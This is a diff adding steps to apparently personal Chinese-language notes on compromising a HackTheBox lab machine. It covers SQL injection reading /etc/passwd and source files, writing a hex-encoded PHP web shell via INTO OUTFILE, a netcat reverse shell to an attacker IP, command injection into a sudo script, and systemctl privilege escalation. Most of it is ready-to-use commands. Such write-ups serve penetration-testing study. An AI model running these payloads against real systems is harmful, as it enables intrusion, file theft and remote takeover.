@@ -30,3 +30,19 @@ hashcat -m 300 hash /usr/share/wordlists/rockyou.txt
 這句urlencode可以查看檔案內容         9999 union select "1","2",(LOAD_FILE("/etc/passwd")),"4","5","6","7"
 這句urlencode可以查看檔案內容         9999 union select "1","2",(TO_BASE64(LOAD_FILE("/var/www/html/index.php"))),"4","5","6","7"
 這句urlencode可以查看檔案內容         9999 union select "1","2",(TO_BASE64(LOAD_FILE("/var/www/html/connection.php"))),"4","5","6","7"
+這句urlencode可以查看檔案內容         9999 union select "1","2",(select '<?php  phpinfo(); ?>'),"4","5","6","7" INTO OUTFILE '/var/www/html/test.php'
+這句urlencode可以寫入webshell        9999 union select "1","2",(select '<?php  phpinfo(); ?>'),"4","5","6","7" INTO OUTFILE '/var/www/html/test16.php' lines terminated by 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e0a--
+
+6.生成hex的cmdshell,在sql中 中斷
+echo '<?php system($_GET["cmd"]);?>' |xxd -p
+3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e0a
+7.SQL Injection
+9999 union select "1","2",(select '<?php  phpinfo(); ?>'),"4","5","6","7" INTO OUTFILE '/var/www/html/test16.php' lines terminated by 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e0a--
+8.取得reverse shell
+http://supersecurehotel.htb/test16.php?cmd=nc -e /bin/bash 10.10.14.50 5555
+9. sudo -l 發現wimpler.py腳本,有個ping的方法,可以input參數進去,但有過濾字符
+input輸入$(/bin/bash)
+10.取的互動式shell
+nc -e /bin/bash 10.10.14.50 6666
+11.上傳LinEnum.sh發現suid檔案有systemctl可以執行,參考以下連接使用systemctl enable root.service取得root
+https://alvinsmith.gitbook.io/progressive-oscp/untitled/vulnversity-privilege-escalation
